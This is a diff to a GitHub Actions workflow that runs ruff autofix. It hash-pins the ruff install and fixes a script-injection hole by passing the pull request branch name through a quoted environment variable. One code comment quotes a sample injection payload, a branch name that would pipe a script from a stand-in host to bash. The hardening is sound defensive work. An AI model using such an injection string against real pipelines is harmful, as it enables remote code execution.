@@ -17,7 +17,7 @@ name: 'Autofix (ruff)'
 
 on:
   pull_request:
-    branches: [main]
+    branches: [main, dev]
 
 concurrency:
   group: autofix-${{ github.event.pull_request.number }}
@@ -59,7 +59,12 @@ jobs:
 
       - name: Install ruff
         if: steps.has-pat.outputs.configured == 'true'
-        run: pip install "ruff>=0.6.0"
+        # Hash-pinned, matching .pre-commit-config.yaml and lint.yml (see
+        # lint.yml's comment on the same OpenSSF Scorecard finding and why
+        # this is a single printf line rather than a heredoc).
+        run: |
+          printf '%s\n' 'ruff==0.16.4 --hash=sha256:f2d812e482f5a7e02eee26cd73d2a37ebbdf47d795ea63ba1b89110ae93e9fb3 --hash=sha256:13171aa9d9af2240ee3504e639de73122c67e74036de5ba2e1d01422cd17e3dc' > /tmp/ruff-pin.txt
+          pip install --require-hashes -r /tmp/ruff-pin.txt
 
       - name: Autofix
         if: steps.has-pat.outputs.configured == 'true'
@@ -69,6 +74,15 @@ jobs:
 
       - name: Commit and push fixes if any
         if: steps.has-pat.outputs.configured == 'true'
+        env:
+          # A branch name is attacker-controlled text (anyone who can open a
+          # PR picks it), so it goes through env + a quoted shell variable
+          # rather than being interpolated directly into the script -- a
+          # branch literally named `"; curl evil.sh | bash #` would run as
+          # shell syntax if `${{ }}` were used inline here instead. Flagged
+          # by OpenSSF Scorecard's Dangerous-Workflow check; this is the
+          # standard fix: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections
+          HEAD_REF: ${{ github.event.pull_request.head.ref }}
         run: |
           if git diff --quiet; then
             echo "Nothing to fix."
@@ -78,4 +92,4 @@ jobs:
           git config user.email "trentorch-bot@users.noreply.github.com"
           git add -A
           git commit -m "style: ruff autofix + format"
-          git push origin HEAD:${{ github.event.pull_request.head.ref }}
+          git push origin "HEAD:$HEAD_REF"
